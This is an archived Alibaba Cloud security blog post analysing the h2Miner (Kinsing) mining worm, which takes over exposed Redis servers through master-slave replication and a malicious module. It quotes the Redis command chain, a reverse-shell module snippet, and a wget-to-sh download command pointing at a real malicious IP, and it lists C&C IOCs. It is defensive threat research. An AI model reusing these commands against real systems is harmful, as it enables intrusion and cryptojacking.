{
    "id": "9f0b5152-e099-43a1-a47f-8b8c4578b56c",
    "created_at": "2023-01-12T15:05:42.513786Z",
    "updated_at": "2025-03-27T02:17:01.045912Z",
    "deleted_at": null,
    "sha1_hash": "cbcf55e5bebc4d528268712f91bf655c3c0cc24b",
    "title": "2020-01-16 - New Outbreak of h2Miner Worms Exploiting Redis RCE Detected",
    "authors": "",
    "file_creation_date": "2022-05-28T17:40:27Z",
    "file_modification_date": "2022-05-28T17:40:27Z",
    "file_size": 754757,
    "plain_text": "# New Outbreak of h2Miner Worms Exploiting Redis RCE Detected\n\n**[alibabacloud.com/blog/new-outbreak-of-h2miner-worms-exploiting-redis-rce-detected_595743](https://www.alibabacloud.com/blog/new-outbreak-of-h2miner-worms-exploiting-redis-rce-detected_595743)**\n\n[Alibaba Cloud Security January 16, 2020](https://community.alibabacloud.com/users/5705432749246152) 9,926 **0**\n\nIn this post, we'll discuss the recent outbreak of h2Miner worms, which exploit Redis's\nRemote Command Execution (RCE), and also share some useful security tips by the Alibaba\nCloud Security team.\n\n_By Cang Po, with special thanks to Sang Duo._\n\nRecently, Alibaba Cloud's security team detected a sudden outbreak of h2Miner mining\nbotnet worms. This type of malicious worm uses unauthorized or weak passwords for Redis\nas gateways to your systems, then synchronizes its own malicious module with that of an\nassociated server through master-slave synchronization, and finally loads this malicious\nmodule on the target machine and executes malicious instructions.\n\nIn the past, attacks to your systems were mainly done through a method that involved\nscheduled tasks or SSH keys that were written to your target machine after the attacker logs\ninto Redis. Fortunately, this method often doesn't succeed to penetrate your system due to\n\n\n-----\n\n[permission control or system versioning complications. Nonetheless, this loading module](https://www.alibabacloud.com/product/ram)\nmethod can directly execute arbitrary instructions or obtain the relevant shell interactive\nenvironment, which is harmful to your system.\n\nDue to the large number of Redis systems hosted online (nearly 1 million), Alibaba Cloud's\nsecurity team, as a friendly reminder to our customers, recommends that users do not\nexpose their Redis service to the public network and check the strength of their passwords\nregularly and also check whether they are affected by worms in a timely manner.\n\nOf course, another effective means of protecting your systems is to purchase some of the\nrelevant security products and services from Alibaba Cloud's large portfolio of security\nproducts and solutions to prevent further malicious attacks. Some of our most popular\n[products include our Anti-DDoS product packages, such as Anti-DDoS Basic,](https://www.alibabacloud.com/product/anti-ddos) [Anti-DDoS Pro](https://www.alibabacloud.com/product/ddos-pro)\n[and Anti-DDoS Premium packages, as well as our Web Application Firewall. You can contact](https://www.alibabacloud.com/products/ddosdip)\nour sales team to learn which security products are suitable for your needs.\n\n## H2Miner Gang\n\nh2Miner is a mining botnet under Linux, which can invade your system through various\ndifferent means including the hadoop yarn unauthorized vulnerability, the vulnerability that\ninvolves unauthorized access to Docker, and Redis's Remote Command Execution (RCE)\nvulnerability. The mining botnet works by downloading malicious scripts and malicious\nprograms for mining your precious data, horizontal scanning expansion Attack surface and\nmaintain Command and Control (C&C) communication.\n\n## Redis RCE\n\n[Knowledge of this issues was shared by Pavel Toporkov at ZeroNights 2018. After version](https://2018.zeronights.ru/en/)\n4.0, Redis supports the function of loading external modules, which provides users with the\noption for loading so files compiled with C in Redis to achieve specific Redis commands.\nThis function although useful, introduced a vulnerability, where, in Redis master-slave mode,\nfiles could be synchronized to the slave through the `fullresync mode to complete the`\ntransmission of malicious so files. After completing the transfer, the attackers load module on\nthe target Redis and execute any instruction.\n\n## Worm Analysis\n\nRecently, the Alibaba Cloud security team discovered that the size of the h2Miner group\nsuddenly increased sharply. According to their analysis, the overall process of how an attack\noccurs is as follows:\n\n\n-----\n\nh2Miner mainly uses Redis's RCE to complete the intrusion. First, attackers use\nunauthorized or weak passwords to gain access to Redis servers. Then, they use `config`\n```\nset dbfilename red2.so to modify the save file name. After that, attackers use the\nslaveof command to set the host address of the master-slave replication. When the target\n\n```\nRedis service establishes a master-slave connection with the malicious Redis service owned\nby the attacker, the attacker controls the malicious Redis to send `fullresync command for`\nfile synchronization, then the `red2.so file will be written on the target machine. After this,`\nattackers use `module load ./red2.so to load this so file. This module can execute`\narbitrary instructions or initiate a reverse connection to obtain the shell environment\naccording to the parameters passed in.\n```\n  if (RedisModule_CreateCommand(ctx, \"system.exec\",\n    DoCommand, \"readonly\", 1, 1, 1) == REDISMODULE_ERR)\n    return REDISMODULE_ERR;\n   if (RedisModule_CreateCommand(ctx, \"system.rev\",\n    RevShellCommand, \"readonly\", 1, 1, 1) == REDISMODULE_ERR)\n    return REDISMODULE_ERR;\n\n```\n\n-----\n\nAfter executing a malicious instruction such as `/ bin / sh -c wget -q -O-`\n```\nhttp://195.3.146.118/unk.sh | sh> / dev / null 2> & 1, the attacker will reset the\n\n```\nbackup file name and use `module unload to unload the system module to clear the`\ncorresponding traces. However, the `red2.so file still remains on the attacked host. Users`\nare advised to pay attention to whether there is such a suspicious file in their Redis service\ndirectory.\n\nIn addition to killing some malicious processes to steal resources, the attacker followed up\nthe malicious script by downloading and running malicious binary files to\n[http://142.44.191.122/kinsing . This means that the process name or directory name](http://142.44.191.122/kinsing)\ncontaining `kinsing on the host may indicate that this machine has been infected by the`\nworm.\n\nAccording to the results of the simple reverse analysis, the malicious program mainly has the\nfollowing functions:\n\nDownload the file and execute\nExecute the mining program\nMaintain C&C communication and execute commands\n\n\n-----\n\n-----\n\nUse masscan to scan externally to expand the influence. In addition, the IP address of the\nC&C server is hard-coded in the program, and the affected host will communicate with the\nC&C communication server in the form of HTTP, where the information of the zombie\n(hacked server) is identified in the HTTP header.\n```\nGET /h HTTP/1.1\nHost: 91.215.169.111\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like\nGecko) Chrome/78.0.3904.108 Safari/537.36\nArch: amd64\nCores: 2\nMem: 3944\nOs: linux\nOsname: debian\nOsversion: 10.0\nRoot: false\nS: k\nUuid: xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxx\nVersion: 26\nAccept-Encoding: gzip\n\n## Other Attack Methods\n\n```\nNo. Vulnerabilities\n\n1 Solr dataimport RCE(CVE-2019-0193)\n\n2 Hadoop Yarn REST API Unauthorized RCE (CVE-2017-15718)\n\n3 Docker Remote API Unauthorized RCE\n\n4 ThinkPHP5 Global Variable Override RCE\n\n5 Confluence Unauthorized RCE (CVE-2019-3396)\n\n## IOC\n\n/kinsing\n\n\n-----\n\n```\n142.44.191.122/t.sh\n185.92.74.42/h.sh\n142.44.191.122/spr.sh\n142.44.191.122/spre.sh\n195.3.146.118/unk.sh\n\n```\nc&c\n```\n45.10.88.102\n91.215.169.111\n139.99.50.255\n46.243.253.167\n195.123.220.193\n\n## Security Advice\n\n```\nTo our customers, we have the following recommendations. First, Redis should not be\nexposed to the Internet and should be secured with a strong password. Next, it is important\nthe customers check whether the red2.so file is left in the Redis path or the file\n```\nname/process name on the host contains kinsing\n\n```\n[Redis](https://community.alibabacloud.com/tags/type_blog-tagid_32/) [Security](https://community.alibabacloud.com/tags/type_blog-tagid_2299/) [Web Application Firewall](https://community.alibabacloud.com/tags/type_blog-tagid_24760/) [Managed Security Service](https://community.alibabacloud.com/tags/type_blog-tagid_28508/) [Mining Worm](https://community.alibabacloud.com/tags/type_blog-tagid_29371/) [h2Miner](https://community.alibabacloud.com/tags/type_blog-tagid_30424/)\n[Redis RCE](https://community.alibabacloud.com/tags/type_blog-tagid_30425/)\n0 0 **0**\n**Share on**\n\n## Read previous post:\n\nWhat Defenders Must Do to Fight Hackers and Cyber Attacks Using More Powerful\nWeapons?\n\n## Read next post:\n\n[Cloud-based Mining Botnet Trends in 2019: Mining Trojans Spreading as Worms](https://www.alibabacloud.com/blog/cloud-based-mining-botnet-trends-in-2019-mining-trojans-spreading-as-worms_595839)\n\n## Alibaba Cloud Security\n\n33 posts | 15 followers\n\nFollow\n\n### You may also like\n\n\n-----\n\n### Comments\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2020/2020-01-16 - New Outbreak of h2Miner Worms Exploiting Redis RCE Detected.pdf"
    ],
    "report_names": [
        "2020-01-16 - New Outbreak of h2Miner Worms Exploiting Redis RCE Detected.pdf"
    ],
    "threat_actors": [
        {
            "id": "3fff98c9-ad02-401d-9d4b-f78b5b634f31",
            "created_at": "2023-01-06T13:46:38.376868Z",
            "updated_at": "2025-03-27T02:00:02.818071Z",
            "deleted_at": null,
            "main_name": "Cleaver",
            "aliases": [
                "Cobalt Gypsy",
                "G0003",
                "Operation Cleaver",
                "Op Cleaver",
                "Tarh Andishan",
                "Alibaba",
                "TG-2889"
            ],
            "source_name": "MISPGALAXY:Cleaver",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "a6c351ea-01f1-4c9b-af75-cfbb3b269ed3",
            "created_at": "2023-01-06T13:46:39.390649Z",
            "updated_at": "2025-03-27T02:00:03.072899Z",
            "deleted_at": null,
            "main_name": "Kinsing",
            "aliases": [
                "Money Libra"
            ],
            "source_name": "MISPGALAXY:Kinsing",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        }
    ],
    "ts_created_at": 1673535942,
    "ts_updated_at": 1743041821,
    "ts_creation_date": 1653759627,
    "ts_modification_date": 1653759627,
    "files": {
        "pdf": "https://archive.orkl.eu/cbcf55e5bebc4d528268712f91bf655c3c0cc24b.pdf",
        "text": "https://archive.orkl.eu/cbcf55e5bebc4d528268712f91bf655c3c0cc24b.txt",
        "img": "https://archive.orkl.eu/cbcf55e5bebc4d528268712f91bf655c3c0cc24b.jpg"
    }
}